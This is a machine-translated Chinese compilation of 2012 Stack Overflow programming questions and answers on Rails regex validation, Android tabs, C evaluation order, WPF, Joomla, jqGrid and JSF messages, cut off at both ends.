结尾

每次我在表格中输入日期时，其他情况都会随着错误而上升。我很确定我的代码是正确的。我错过了什么吗？

**编辑：**

找到了解决方案。像这样工作：

```
regexymd = /^[0-9]{4}[.][0-9]{1,2}[.][0-9]{1,2}$/
regexym = /^[0-9]{4}[.][0-9]{1,2}$/
regexy =  /^[0-9]{4}$/
regex_final = Regexp.union(regexymd, regexym)
regex_final = Regexp.union(regex_final, regexy)

validates :data, :format => { :with => regex_final } 
```

希望对和我有同样情况的人有所帮助。谢谢你的回答。我很感激反馈。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T10:17:13.280

您不匹配 variable `data`，而是匹配*symbol* `:data`，这就是它引发错误的原因（如果您可以发布该错误，这将很有用，顺便说一句）。

无论如何，我认为你想要的是这样的：

```
def data_format_correct
  regexymd = /[0-9]{4}[.][0-9]{1,2}[.][0-9]{1,2}/
  regexym = /[0-9]{4}[.][0-9]{1,2}/
  regexy = /[0-9]{4}/
  if regexymd.match(data.to_s)
    return true
  elsif  regexym.match(data.to_s) 
    return true
  elsif regexy.match(data.to_s) 
    return true
  else
    errors.add(:data)
    return
  end
end 
```

# java - Java页面加载库

> ID：11736601
> 
> 赞同：0
> 
> 时间：2012-07-31T09:03:54.533
> 
> 标签：java, pingdom, http-monitor

[我需要编写一些与http://tools.pingdom.com/fpt/](http://tools.pingdom.com/fpt/)或[http://pageload.monitis.com/pagespeed.jsp](http://pageload.monitis.com/pagespeed.jsp)具有相同功能的网页负载测量 Java 工具。我需要测量页面及其所有嵌入元素的加载时间。工具应该没有 GUI。是否有一些用于此目的的 Java 库？如果不是，解决方案是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-23T19:01:39.227

WebPageTest 的私有实例会做你想做的事 - 它可以通过它的 API 驱动

这里有关于如何设置和“一次性”实例的描述 - [http://andydavies.me/blog/2012/09/18/how-to-create-an-all-in-one-webpagetest-private-实例/](http://andydavies.me/blog/2012/09/18/how-to-create-an-all-in-one-webpagetest-private-instance/)

如果您想了解更多关于如何用它做更复杂事情的详细信息，请联系我

# android - 使用 robotsium 从第一个应用程序测试第二个应用程序

> ID：11736602
> 
> 赞同：0
> 
> 时间：2012-07-31T09:03:58.567
> 
> 标签：android, robotium

我有一个使用机器人测试的应用程序。应用程序的所有功能都经过正确测试。最后，此应用程序使用媒体播放器播放特定内容。媒体播放器是第二个应用程序。因此，在播放时，我无法使用 Solo.sendKey 命令从播放器返回（我认为这是因为播放器是另一个应用程序）。有什么方法可以使用 robotsium 与第一个应用程序从第一个应用程序进行通信？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:20:16.143

不幸的是没有。Robotium 一次只能测试一个应用程序。

# python - 在python中拆分字符串

> ID：11736605
> 
> 赞同：0
> 
> 时间：2012-07-31T09:04:14.833
> 
> 标签：python, python-2.6

我有如下的python字符串

```
mystring = "copy "d:\Progrm Files" "c:\Progrm Files\once up on a time"" 
```

如何将此字符串拆分为

```
mylist = [copy,d:\Progrm Files,c:\Progrm Files\once up on a time] 
```

当我尝试使用`mysring.split(" ")`空格`Progrm Files`并且`once up on a time`也被拆分时。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-31T09:07:29.237

你想看看[`shlex`模块](http://docs.python.org/library/shlex.html)，shell lexer。它专门用于将命令行（例如您的命令行）拆分为其组成部分，包括正确处理引用。

```
>>> import shlex
>>> command = r'copy "d:\Program Files" "c:\Program Files\once up on a time"'
>>> shlex.split(command)
['copy', 'd:\\Program Files', 'c:\\Program Files\\once up on a time'] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:33:54.057

这个正则表达式捕捉你想要的：

```
import re

mystring = "copy \"d:\Progrm Files\" \"c:\Progrm Files\once up on a time\""

m = re.search(r'([\w]*) ["]?([[\w]:\\[\w\\ ]+)*["]? ["]?([[\w]:\\[\w\\ ]+)*["]?', mystring)

print m.group(1)
print m.group(2)
print m.group(3)

>>> 
copy
d:\Progrm Files
c:\Progrm Files\once up on a time 
```

# android - android：对于选项卡布局，我的编码无法在第二个选项卡上工作，但可以在第一个选项卡上工作

> ID：11736606
> 
> 赞同：0
> 
> 时间：2012-07-31T09:04:15.190
> 
> 标签：android, layout, button, tabs, switch-statement

我需要帮助来解决这个问题。我的编码仅适用于第一个布局但不适用于第二个布局的问题。

**这是我的标签 xml 布局**

```
<?xml version="1.0" encoding="utf-8"?>
<TabHost xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@android:id/tabhost"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent">
    <LinearLayout
        android:orientation="vertical"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">
        <TabWidget
            android:id="@android:id/tabs"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content" />
        <FrameLayout
            android:id="@android:id/tabcontent"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"/>
    </LinearLayout>
</TabHost> 
```

**这是我的标签 java 文件**

```
package watresystem.com;

import android.app.TabActivity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TabHost;
import android.widget.TabHost.TabSpec;

public class WatersystemActivity extends TabActivity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        TabHost tabHost = getTabHost();

        // Tab for Output
        TabSpec outputspec = tabHost.newTabSpec("Output");
        // setting Title and Icon for the Tab
        outputspec.setIndicator("Output", getResources().getDrawable(R.drawable.icon_output_tab));
        Intent outputIntent = new Intent(this, OutputActivity.class);
        outputspec.setContent(outputIntent);

        // Tab for Input
        TabSpec inputspec = tabHost.newTabSpec("Input");
        inputspec.setIndicator("Input", getResources().getDrawable(R.drawable.icon_input_tab));
        Intent inputIntent = new Intent(this, InputActivity.class);
        inputspec.setContent(inputIntent);

        // Tab for Time & Date
        TabSpec timespec = tabHost.newTabSpec("Time");
        timespec.setIndicator("Time", getResources().getDrawable(R.drawable.icon_time_tab));
        Intent timeIntent = new Intent(this, TimeActivity.class);
        timespec.setContent(timeIntent);

        // Adding all TabSpec to TabHost
        tabHost.addTab(outputspec); // Adding output tab
        tabHost.addTab(inputspec); // Adding input tab
        tabHost.addTab(timespec); // Adding time tab
    }
} 
```

**我的标签布局上输入按钮的java代码**

```
package watresystem.com;

import android.app.Activity;
import android.os.Bundle;
import ioio.lib.api.DigitalInput;
import ioio.lib.api.exception.ConnectionLostException;
import ioio.lib.util.AbstractIOIOActivity;
import android.widget.TextView;

public class InputActivity extends AbstractIOIOActivity {
    private final int BUTTON1_PIN = 37;
    private final int BUTTON2_PIN = 32;
    private final int BUTTON3_PIN = 33;

    private TextView mBtn1TextView;
    private TextView mBtn2TextView;
    private TextView mBtn3TextView;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.input_layout);

        mBtn1TextView = (TextView) findViewById(R.id.btn1TextView);
        mBtn2TextView = (TextView) findViewById(R.id.btn2TextView);
        mBtn3TextView = (TextView) findViewById(R.id.btn3TextView);
    }

    class IOIOThread extends AbstractIOIOActivity.IOIOThread {
        private DigitalInput mButton1;
        private DigitalInput mButton2;
        private DigitalInput mButton3;

        @Override
        public void setup() throws ConnectionLostException {
            try {
                mButton1 = ioio_.openDigitalInput(BUTTON1_PIN, DigitalInput.Spec.Mode.PULL_UP);
                mButton2 = ioio_.openDigitalInput(BUTTON2_PIN, DigitalInput.Spec.Mode.PULL_UP);
                mButton3 = ioio_.openDigitalInput(BUTTON3_PIN, DigitalInput.Spec.Mode.PULL_UP);
            } catch (ConnectionLostException e) {
                throw e;
            }
        }

        @Override
        public void loop() throws ConnectionLostException {
            try {
                String button1txt;
                String button2txt;
                String button3txt;
                final boolean reading1 = mButton1.read();
                final boolean reading2 = mButton2.read();
                final boolean reading3 = mButton3.read();

                if (!reading1) {
                    button1txt = getString(R.string.button1) + " active!";
                } else {
                    button1txt = getString(R.string.button1);
                }
                if (!reading2) {
                    button2txt = getString(R.string.button2) + " active!";
                } else {
                    button2txt = getString(R.string.button2);
                }
                if (!reading3) {
                    button3txt = getString(R.string.button3) + " active!";
                } else {
                    button3txt = getString(R.string.button3);
                }

                setText(button1txt, button2txt, button3txt);
                sleep(10);
            } catch (InterruptedException e) {
                ioio_.disconnect();
            } catch (ConnectionLostException e) {
                throw e;
            }
        }
    }

    @Override
    protected AbstractIOIOActivity.IOIOThread createIOIOThread() {
        return new IOIOThread();
    }

    private void setText(final String str1, final String str2, final String str3) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                mBtn1TextView.setText(str1);
                mBtn2TextView.setText(str2);
                mBtn3TextView.setText(str3);
            }
        });
    }
} 
```

**我的输入按钮的 xml 布局**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center" >

    <!-- Screen Design for Input -->

    <TextView
        android:id="@+id/btn1TextView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/button1"
        android:textSize="30sp"
        android:textStyle="bold" />

    <TextView
        android:id="@+id/btn2TextView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/button2"
        android:textSize="30sp"
        android:textStyle="bold" />

    <TextView
        android:id="@+id/btn3TextView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/button3"
        android:textSize="30sp"
        android:textStyle="bold" />

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:08:04.840

看到这是活动

```
public class MainActivity extends TabActivity {

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    Resources ressources = getResources(); 
    TabHost tabHost = getTabHost(); 

    // Android tab
    Intent intentAndroid = new Intent().setClass(this, AndroidActivity.class);
    TabSpec tabSpecAndroid = tabHost
      .newTabSpec("Android")
      .setIndicator("", ressources.getDrawable(R.drawable.icon_android_config))
      .setContent(intentAndroid);

    // Apple tab
    Intent intentApple = new Intent().setClass(this, AppleActivity.class);
    TabSpec tabSpecApple = tabHost
      .newTabSpec("Apple")
      .setIndicator("", ressources.getDrawable(R.drawable.icon_apple_config))
      .setContent(intentApple);

    // Windows tab
    Intent intentWindows = new Intent().setClass(this, WindowsActivity.class);
    TabSpec tabSpecWindows = tabHost
      .newTabSpec("Windows")
      .setIndicator("", ressources.getDrawable(R.drawable.icon_windows_config))
      .setContent(intentWindows);

    // Blackberry tab
    Intent intentBerry = new Intent().setClass(this, BlackBerryActivity.class);
    TabSpec tabSpecBerry = tabHost
      .newTabSpec("Berry")
      .setIndicator("", ressources.getDrawable(R.drawable.icon_blackberry_config))
      .setContent(intentBerry);

    // add all tabs 
    tabHost.addTab(tabSpecAndroid);
    tabHost.addTab(tabSpecApple);
    tabHost.addTab(tabSpecWindows);
    tabHost.addTab(tabSpecBerry);

    //set Windows tab as default (zero based)
    tabHost.setCurrentTab(2);
} 
 } 
```

这是针对 XML

```
<?xml version="1.0" encoding="utf-8"?>
  <TabHost xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@android:id/tabhost"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent">
 <LinearLayout
    android:orientation="vertical"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:padding="5dp">
    <TabWidget
        android:id="@android:id/tabs"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" />
    <FrameLayout
        android:id="@android:id/tabcontent"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:padding="5dp" />
  </LinearLayout>
 </TabHost> 
```

看到这个[http://www.mkyong.com/android/android-tablayout-example/](http://www.mkyong.com/android/android-tablayout-example/)

# ios - IOS：imageView的奇怪崩溃

> ID：11736609
> 
> 赞同：0
> 
> 时间：2012-07-31T09:04:19.247
> 
> 标签：ios, uitableview, exc-bad-access

在我的应用程序中，我有一个带有自定义单元格的 tableView，这是自定义单元格的 .h

```
 @interface TableViewCell : UITableViewCell{

    IBOutlet UILabel *prod;
    IBOutlet UIImageView *back;
}

@property (nonatomic, retain) IBOutlet UILabel *prod;
@property (nonatomic, retain) IBOutlet UIImageView *back; 
```

它是.m

```
@implementation TableViewCell

@synthesize prod, back;

- (id)initWithStyle:(UITableViewCellStyle)style reuseIdentifier:(NSString *)reuseIdentifier
{
    self = [super initWithStyle:style reuseIdentifier:reuseIdentifier];
    if (self) {
        // Initialization code
    }
    return self;
}

- (void)setSelected:(BOOL)selected animated:(BOOL)animated
{
    [super setSelected:selected animated:animated];

    // Configure the view for the selected state
}

- (void) dealloc{
    [super dealloc];
    [prod release];
    [back release];
}

@end 
```

在我的 tableView 委托方法中，我有这个

```
- (void)tableView:(UITableView *)tableView commitEditingStyle... 
```

但是当我删除 tableView 的最后一行时，这里有一个 EXC_BAD ACCESS：

```
- (void) dealloc{
    [super dealloc];
    [prod release];
    [back release]; <-- for this I have a EXC BAD ACCESS
} 
```

为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:06:41.773

您应该`[super dealloc]`在方法结束时调用`dealloc`。

此外，当您拥有属性时，请利用它们。而不是直接释放分配`nil`给他们：

```
- (void)dealloc
{
    self.prod = nil;
    self.back = nil;
    [super dealloc];
} 
```

# c - c中printf中的多个赋值语句

> ID：11736610
> 
> 赞同：1
> 
> 时间：2012-07-31T09:04:19.467
> 
> 标签：c, compiler-construction, printf

谁能帮我理解下面代码的输出：

```
int main()
{
    int a=35;
    printf("%d %d %d %d %d",a--,a,a=20,a++,a=39);
    return 0;
} 
```

**输出**：20 19 19 39 19

赞赏有关如何在 printf 函数中在 c 中处理（编译）赋值的见解。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T09:06:23.067

这是未指定的行为。C 标准中没有指定函数参数的求值顺序，因此它可以以任何顺序发生。

人们已经在您可以阅读的评论中为您提供了一些链接。但简而言之，有一些东西叫做“序列点”。这些确保之前需要执行的所有内容都被执行，然后程序可以继续。在两个序列点之间，指令可以按任意顺序执行。

来自 C11 标准：

3.4.4：

> 1.  **未指定的行为**
>     使用未指定的值，或本国际标准提供两种或多种可能性并且在任何情况下都选择不强加进一步要求的其他行为
>     
>     
> 2.  **示例**未指定行为的一个示例是计算函数参数的顺序。

6.5.2.2.10 说

> **在函数指示符和实际参数的评估之后但在实际调用之前有一个序列点。**调用函数（包括其他函数调用）中的每个求值，如果在被调用函数的主体执行之前或之后没有特别排序，则相对于被调用函数的执行是不确定的。

换句话说，函数参数的求值之间没有序列点，因此它们可以按照编译器感觉的任何顺序进行求值。

为了完成答案，这也是未定义的行为，因为您尝试`a`在两个序列点之间多次更改值。

6.5.2：

> 如果标量对象上的副作用相对于同一标量对象上的不同副作用或使用相同标量对象的值的值计算是未排序的，则行为未定义。如果表达式的子表达式有多个允许的排序，则如果在任何排序中出现这种未排序的副作用，则行为未定义。^(84))
> 
> ^(84))他的段落呈现未定义的语句表达式，例如
> `i = ++i + 1;`
> `a[i++] = i;`
> while allowed
> `i = i + 1;`
> `a[i] = i;`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:31:35.397

```
printf("%d %d %d %d %d",a--,a,a=20,a++,a=39); 
```

这是**未定义的行为**。

这意味着该程序可以打印：`20 19 19 39 19`甚至`0 0 0 0 0`格式化您的硬盘驱动器。

> (C99, 6.5p2) “在前一个序列点和下一个序列点之间，对象的存储值最多只能通过表达式的评估修改一次。

当然，违反不是约束的“shall”意味着 prgram 调用未定义的行为（参见 C99 中的 4.p2）。

# wpf - 为什么 ItemsControl.ToolTip 只有在鼠标悬停在其项目上时才可见

> ID：11736612
> 
> 赞同：1
> 
> 时间：2012-07-31T09:04:31.540
> 
> 标签：wpf, xaml, tooltip, mouseover, itemscontrol

这里的问题。我有一个**ItemsControl** ，如果用户将鼠标悬停在**ItemsControl**上，我想显示一个**工具提示**。看起来很容易，对吧？

 **这里有一个例子：

```
<ItemsControl BorderBrush="Blue" BorderThickness="1">
    <ItemsControl.ToolTip>
        <ToolTip Content="Text" />
    </ItemsControl.ToolTip>
    <ItemsControl.ItemsPanel>
        <ItemsPanelTemplate>
            <WrapPanel />
        </ItemsPanelTemplate>
    </ItemsControl.ItemsPanel>
    <Label BorderBrush="Red" BorderThickness="1">One</Label>
    <Label BorderBrush="Red" BorderThickness="1">Two</Label>
    <Label BorderBrush="Red" BorderThickness="1">Three</Label>
    <Label BorderBrush="Red" BorderThickness="1">Four</Label>
    <Label BorderBrush="Red" BorderThickness="1">Five</Label>
    <Label BorderBrush="Red" BorderThickness="1">Six</Label>
    <Label BorderBrush="Red" BorderThickness="1">Seven</Label>
</ItemsControl> 
```

使窗口宽度足够小，并让**WrapPanel**包裹一个项目。并尝试将鼠标悬停在**ItemsControl**上（不会出现**ToolTip ），而不是悬停在****Label**上（会出现**ToolTip**）。

为什么这种行为是正确的以及如何强制**工具提示**出现在这种情况下？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T09:09:06.330

`ToolTip`在您给出a之前， for`ItemsControl`在任何情况下都不会显示。`Background``Brush`

```
<ItemsControl Background="Transparent" 
```**

# visual-studio-2010 - Visual Studio 2010：是否可以在此 IDE 中禁用“无复制”？

> ID：11736621
> 
> 赞同：1
> 
> 时间：2012-07-31T09:05:07.007
> 
> 标签：visual-studio-2010

当我不小心双击 CTRL-X 时，我选择的代码被剪切了，但是剪贴板是空的，因为第二个 CTRL-X 剪切了“空选择”之类的东西。这真的很痛苦，对我来说，允许剪切或复制“无”或“空选择”是没有意义的。由于它特定于 Visual Studio，我想知道是否有办法禁用它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:14:15.400

在工具/选项中，选择文本编辑器，然后选择“所有语言”或特定语言。

“没有选择时，将剪切或复制命令应用于空白行”有一个选项。禁用它，我相信它会有所帮助。

# php - JSON在嵌入式网络服务器中的实现

> ID：11736622
> 
> 赞同：1
> 
> 时间：2012-07-31T09:05:19.277
> 
> 标签：php, api, jsonp, json

我对 JSON 很陌生，我希望对我的问题有清晰的看法。

在我当前的项目中，我们将在嵌入式 Web 服务器中实现 JSON。因此，我对嵌入式服务器中的脚本 JSON 以及客户端 APP（智能手机、平板电脑等）提取该信息产生了更多疑问。只是根据请求从服务器获取数据到客户端。请在用于存储数据的服务器端和用于提取该数据的客户端及其位过程中为我提供一些简短的想法。

该变量需要保存动态数据。假设微控制器感测温度（它是一个每次都变化的动态数据），并且这个当前温度需要保存在变量中，并且根据客户端的请求，存储在该变量中的当前温度需要传递给客户端。如何执行？

# mysql - 无法连接到 Joomla DB 但可以访问管理员面板

> ID：11736625
> 
> 赞同：1
> 
> 时间：2012-07-31T09:05:30.083
> 
> 标签：mysql, joomla, joomla2.5

我有一个新的 Joomla (2.5) 站点，它是在另一个运行良好的主机/服务器上开发的。我正试图把它移到我的主机上。

我已经完成了正常的流程，通过 FTP 上传的文件，使用 PHPmyadmin 导出和导入的数据库（我可以提供它导出的 PHPmyadmin 版本是早期版本，如果这有什么不同吗？）最后`configuration.php`文件已被编辑为包括正确的主机、数据库、用户和密码信息。

当我尝试导航到该网站时，我收到以下错误：

```
500 - JDatabase::getInstance: Could not connect to database
joomla.library: 2 - Could not connect to MySQL. 
```

虽然我可以导航到 /administrator 页面并浏览网站的后端/控制面板和页面。

打开调试功能，我得到以下信息：

```
JDatabase::getInstance: Could not connect to database
joomla.library: 2 - Could not connect to MySQL.

Call stack
#   Function    Location
1   JSite->render() JROOT/index.php:48
2   JDocumentHTML->render() JROOT/includes/application.php:261
3   JDocumentHTML->_renderTemplate()    JROOT/libraries/joomla/document     /html/html.php:433
4   JDocumentHTML->getBuffer()  JROOT/libraries/joomla/document/html/html.php:655
5   JDocumentRendererModules->render()  JROOT/libraries/joomla/document    /html/html.php:371
6   JDocumentRendererModule->render()   JROOT/libraries/joomla/document    /html/renderer/modules.php:39
7   JModuleHelper::renderModule()   JROOT/libraries/joomla/document/html/renderer    /module.php:106
8   include()   JROOT/libraries/joomla/application/module/helper.php:175
9   JError::raiseError()    JROOT/modules/mod_wpposts/mod_wpposts.php:31
10  JError::raise() JROOT/libraries/joomla/error/error.php:251 
```

我不是开发人员，不了解以上任何内容！我已经毫无问题地移动/复制了另外几个站点，但这些站点位于同一主机/服务器上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T09:46:56.867

从上面列出的错误日志中，我认为您的问题与模块“wpposts”有关。

尝试从站点取消发布该模块。您可能忘记移动 Wordpress 数据库，现在应该显示“最新帖子”或类似内容的模块出现故障并导致网站瘫痪。

# c# - 如何将控制台应用程序转换为 .dll？

> ID：11736628
> 
> 赞同：23
> 
> 时间：2012-07-31T09:05:43.943
> 
> 标签：c#, dll, console

我正在尝试将用 C# 编写的应用程序转换为 DLL。控制台应用程序接收用户的输入并通过调用我在项目中导入的服务的方法来重置密码。如何将控制台应用程序转换为 DLL，以便在用户希望更改密码时调用我的 DLL？

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2012-07-31T12:41:09.507

右键单击项目-> 属性-> 应用程序-> 输出类型：'类库'

[![在此处输入图像描述](../Images/61915d439146a1aac47e25bc7dd737e1.png)](https://i.stack.imgur.com/4OkVi.png)

# c# - 在关闭 Radwindow 时重新加载父页面上的组合框

> ID：11736630
> 
> 赞同：1
> 
> 时间：2012-07-31T09:05:46.923
> 
> 标签：c#, javascript, asp.net, telerik, radwindow

我在 aspx 页面中有文本框、组合框和按钮控件。要在组合框中添加新值，我使用的是按钮。单击此按钮时，会打开一个**radwindow**，其中添加/更新一些记录。关闭**radwindow**时，我需要在父页面组合框中反映这些记录。为此，我使用了**radwindow** 的`onclientclose`属性。如果用户在单击**radwindow**按钮之前在其他控件中输入了一些数据，那么所有数据都将丢失。我只需要在关闭**radwindow**时重新加载组合框。请提出你的想法。我的代码如下：**`window.location.reload();`**

 ******```
<telerik:RadWindow ID="NationalityDialog" Title="Nationality Data" runat="server" Behaviors="Close" Height="550px" Width="450px" Left="150px" OnClientClose="NationClientClose" />

function NationClientClose(sender, args)
{
     window.location.reload();
     //window.location.href = window.location.href; 
} 
```

谢谢， 苏米亚

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:07:38.183

onclientclose ，使用`__doPostBack`每个 asp.net 页面的一部分的 javascript 函数来重新加载您的网页

```
 function OnClientClose(radWindow) { 
    __doPostBack(event_target, radWindow.argument); 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:24:19.817

使用 RadAjaxManager 和它的客户端事件 ajaxRequest 或 ajaxRequestWithTarget

[这](http://www.telerik.com/help/aspnet-ajax/ajax-radajaxmanager-client-object.html)是它的例子。

通过此事件，您可以重新绑定下拉列表而不会导致回发。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T06:11:16.830

谢谢大家的建议。我已经用 ajaxRequest 做到了。任何人都面临同样的问题，请查看下面的链接[http://www.telerik.com/community/forums/aspnet-ajax/window/refresh-radgrid- on-close-of-radwindow.aspx](http://www.telerik.com/community/forums/aspnet-ajax/window/refresh-radgrid-on-close-of-radwindow.aspx)。

请向我建议您对 radwindow 的以下问题的想法。Radwindow 有一个网格，用户可以在该网格上添加/编辑记录。用户可以转到第 5 页并编辑记录并显示“更新成功消息”。现在用户关闭radwindow 并再次打开 radwindow，消息仍然存在，网格位于第 5 页。如何在第一页显示带有网格的 Radwindow，并且在打开 radwindow 时没有消息。

谢谢， 苏米亚******

# jqgrid - JQGrid 为添加、编辑、删除设置不同的 URL

> ID：11736633
> 
> 赞同：4
> 
> 时间：2012-07-31T09:05:55.243
> 
> 标签：jqgrid

我想在网格顶部添加三个按钮，用于添加、编辑、删除。并且想为每个操作调用单独的 URL。我想为此使用表单编辑。任何人都可以为此建议我一个示例代码。

在此先感谢阿布舍克

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T09:32:52.890

如果您需要在网格顶部添加表单编辑按钮，您应该使用`toppager:true`jqGrid 选项。您不需要定义任何其他寻呼机 div，也不需要使用`pager`选项。jqGrid 为寻呼机本身创建一个新的 div。寻呼机 div 的 id 将由网格的 id 和`"_toppager"`后缀构成。例如，如果您使用

```
<table id="grid"></table> 
```

然后寻呼机的 div 将具有`id="grid_toppager"`并且您可以使用

```
$("#grid").jqGrid("navGrid", "#grid_toppager", {/*navGrid options*/},
    {url: "yourEditUrl"}, {url: "yourAddUrl"}, {url: "yourDelUrl"}); 
```

我建议您阅读[此](https://stackoverflow.com/a/4402903/315935)内容和[此](https://stackoverflow.com/a/3557663/315935)旧答案以获取更多信息。

# wpf - WPF 中的几何 HitTest UIElement

> ID：11736636
> 
> 赞同：0
> 
> 时间：2012-07-31T09:06:17.443
> 
> 标签：wpf, hittest, uielement

无论如何在WPF中使用几何来测试uielement吗？我试过`VisualTreeHelper`了，但它不起作用。`UIElement`如果鼠标用一个点点击它，可能会引发鼠标按下事件。

但是，如果几何与 an 相交，我想引发一个事件`UIElement`。我怎么能这样做？

```
public class MyUI : UIElement
{
    protected override void OnReder(DrawingContext dc)
    {
        dc.DrawRectangle(..., new Rect(12,12,120,120));
        ...
    }
}

MyUI ui = new MyUI();
Grid grid = new Grid();
grid.Children.Add(ui);

EllipseGeometry eg = new EllipseGeometry(new Rect(24,24,40,40));

VisualTreeHelper.HitTest(grid, null, HitTestResult, new GeometryHitTestParameters(eg));

if (results.Count > 0)
    MessageBox.Show("Hit Count = "+results.ToString());

...

List<DependencyObject> results;

public HitTestResultBehavior HitTestResult(HitTestResult result)
{
    results.Add(result.VisualHit);
    return HitTestResultBehavior.Continue;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:23:44.353

尝试使用[GeometryHitTestParameters](http://msdn.microsoft.com/en-us/library/system.windows.media.geometryhittestparameters.aspx)作为参数的[VisualTreeHelper.HitTest 。](http://msdn.microsoft.com/en-us/library/ms608753.aspx)`hitTestParameters`

阅读[视觉层中的命中测试](http://msdn.microsoft.com/en-us/library/ms752097.aspx)。

如果您只需要一个更大的鼠标输入敏感区域，您可以在控件的可视化树中添加一个透明的形状（例如圆形）。

编辑：您的示例代码适用于我，前提是我添加或假设一些事情：

首先，MyUI.OnRender() 中的 DrawRectangle 使用 Brush 来填充矩形。这也可以是一个透明的画笔。

```
dc.DrawRectangle(Brushes.Transparent, null, new Rect(12, 12, 120, 120)); 
```

其次，`results`在某处初始化：

```
private List<DependencyObject> results = new List<DependencyObject>(); 
```

第三，MessageBox 显示一些有意义的东西：

```
if (results.Count > 0)
{
   MessageBox.Show(string.Format("Hit Count = {0}", results.Count));
} 
```

# jsf - JSF 使用 EL 测试全局消息的存在

> ID：11736641
> 
> 赞同：7
> 
> 时间：2012-07-31T09:06:29.690
> 
> 标签：jsf

仅当 JSF 队列中有全局消息时，我才尝试显示一个块。

我尝试使用`rendered="#{not empty facesContext.getMessageList(null)}"`，但它总是被评估为假。

我发现的唯一方法是创建一个自定义 EL 函数并在 java 中测试它。

例如。: 我的 el 函数:

```
public static boolean isFacesGlobalMessages() {
  return ! FacesContext.getCurrentInstance().getMessageList(null).isEmpty();
} 
```

JSF 页面：

```
<h:panelGroup class="block1" layout="block" rendered="#{el:isFacesGlobalMessages()}">
  <div class="block-warn-body">
    <rich:messages id="msg" globalOnly="true"/>
  </div>
</h:panelGroup> 
```

我正在使用 Mojarra 2.1.5。

我错过了什么吗？谢谢 ！

编辑：尝试了以下建议，但到目前为止没有运气：

*   `#{not empty facesContext.getMessageList(null)}`-> 总是假的
*   `#{! facesContext.getMessageList(null)}`-> 错误
*   `#{! empty facesContext.getMessageList(null)}`-> 总是假的
*   `#{fn:length(facesContext.getMessageList(null)) > 0}`-> 总是假的
*   `#{not empty facesContext.messageList(null)}`-> 错误：找不到方法消息列表
*   `#{not empty facesContext.messageList}`-> 如果是验证错误，则返回 true（我只希望全局错误为 true）
*   `#{! facesContext.getMessageList(null).isEmpty()}`-> 抛出 IllegalAccessException：类 javax.el.BeanELResolver 无法访问带有修饰符“public”的类 java.util.Collections$UnmodifiableCollection 的成员

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-07-31T09:30:22.933

无需*自定义 EL 功能*

试试这个

```
rendered="#{not empty facesContext.messageList}" 
```

* * *

**编辑**

自己没试过，但是试试

```
rendered="#{not empty facesContext.messageList(null)}" 
```

一个想法...

```
 rendered="#{not facesContext.validationFailed and not empty facesContext.messageList}" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-04-11T21:35:42.870

我知道这是一个旧线程，但是在努力寻找难以捉摸的解决方案之后，我找到了对这种行为的解释，并且由于我无法在任何地方找到这种解释（不知道为什么），我认为这可能会有所帮助。

我做了一个 el 函数略有不同：

```
public static boolean hasMessages(String clientId) {
    return !FacesContext.getCurrentInstance().getMessageList(clientId).isEmpty();
} 
```

不同的是参数`clientId`。此函数的行为与使用`#{not empty facesContext.getMessageList(clientId)}`. 调试代码，我注意到当我用 调用函数时`clientId = null`，函数`clientId`内部的值实际上是`""`（空字符串）。

之后，我查阅了EL 3.0 Spec，发现：

> 第 1.23 节 - 类型转换
> 
> > 每个表达式都在预期类型的​​上下文中进行评估。表达式评估的结果可能与预期类型不完全匹配，因此应用以下部分中描述的规则。[...]
> 
> 第 1.23.2 节 - 将 A 强制转换为字符串
> 
> > 如果 A 为空：返回 "" [...]

所以，我认为没有办法`clientId = null`通过将`null`值作为参数传递来请求消息。唯一的方法是拥有一个不使用参数或测试参数是否设置为空字符串的函数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-07-31T04:58:49.097

试试这个：

```
